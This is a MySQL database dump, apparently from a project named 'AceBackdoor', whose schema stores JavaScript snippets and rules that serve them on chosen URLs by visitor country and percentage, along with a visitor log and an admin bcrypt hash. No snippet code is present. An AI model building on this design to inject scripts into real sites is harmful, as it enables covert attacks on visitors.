-- MySQL dump 10.13  Distrib 9.1.0, for Win64 (x86_64)
--
-- Host: localhost    Database: apijquery_local
-- ------------------------------------------------------
-- Server version	5.5.5-10.4.32-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `javascriptsnippets`
--

DROP TABLE IF EXISTS `javascriptsnippets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `javascriptsnippets` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `script` text NOT NULL,
  `isActive` tinyint(1) DEFAULT 0,
  `createdAt` datetime NOT NULL,
  `updatedAt` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `javascriptsnippets`
--

LOCK TABLES `javascriptsnippets` WRITE;
/*!40000 ALTER TABLE `javascriptsnippets` DISABLE KEYS */;
/*!40000 ALTER TABLE `javascriptsnippets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rules`
--

DROP TABLE IF EXISTS `rules`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `rules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `countries` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL CHECK (json_valid(`countries`)),
  `percentage` int(11) NOT NULL,
  `scriptId` int(11) DEFAULT NULL,
  `isActive` tinyint(1) NOT NULL DEFAULT 0,
  `createdAt` datetime NOT NULL,
  `updatedAt` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `scriptId` (`scriptId`),
  CONSTRAINT `rules_ibfk_1` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_10` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_11` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_12` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_13` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_14` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_2` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_3` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_4` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_5` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_6` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_7` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_8` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `rules_ibfk_9` FOREIGN KEY (`scriptId`) REFERENCES `javascriptsnippets` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rules`
--

LOCK TABLES `rules` WRITE;
/*!40000 ALTER TABLE `rules` DISABLE KEYS */;
/*!40000 ALTER TABLE `rules` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sequelizemeta`
--

DROP TABLE IF EXISTS `sequelizemeta`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sequelizemeta` (
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`name`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sequelizemeta`
--

LOCK TABLES `sequelizemeta` WRITE;
/*!40000 ALTER TABLE `sequelizemeta` DISABLE KEYS */;
INSERT INTO `sequelizemeta` VALUES ('20241127144723-create-visitors.js'),('20241128100000-create-javascript-snippet.js'),('20241129194503-add-active-lastActive-to-visitors.js');
/*!40000 ALTER TABLE `sequelizemeta` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `createdAt` datetime NOT NULL,
  `updatedAt` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin','$2b$10$mWTbyiuu3XwNFCgsR3b9pOzZHBvIE8gMn/zesA2SfKR8Ww3FfsTOu','2025-08-26 20:59:48','2025-08-26 20:59:48');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `visitors`
--

DROP TABLE IF EXISTS `visitors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `visitors` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `country` varchar(50) NOT NULL,
  `timestamp` datetime NOT NULL,
  `uniqueVisit` tinyint(1) DEFAULT 0,
  `createdAt` datetime NOT NULL,
  `updatedAt` datetime NOT NULL,
  `lastActive` datetime NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `visitors`
--

LOCK TABLES `visitors` WRITE;
/*!40000 ALTER TABLE `visitors` DISABLE KEYS */;
INSERT INTO `visitors` VALUES (1,'file:///C:/Users/Asuna/Desktop/AceBackdoor/ace-backdoor/backend/public/test-websites/index.html','127.0.0.1','Unknown','2025-09-01 09:31:42',1,'2025-08-26 21:08:12','2025-09-01 09:32:24','2025-09-01 09:32:07',0),(2,'file:///C:/Users/Asuna/Desktop/AceBackdoor/ace-backdoor/backend/public/test-websites/index.html','127.0.0.1','Unknown','2025-08-26 21:08:12',1,'2025-08-26 21:08:12','2025-08-26 21:08:28','2025-08-26 21:08:12',0);
/*!40000 ALTER TABLE `visitors` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-09-06 19:14:45
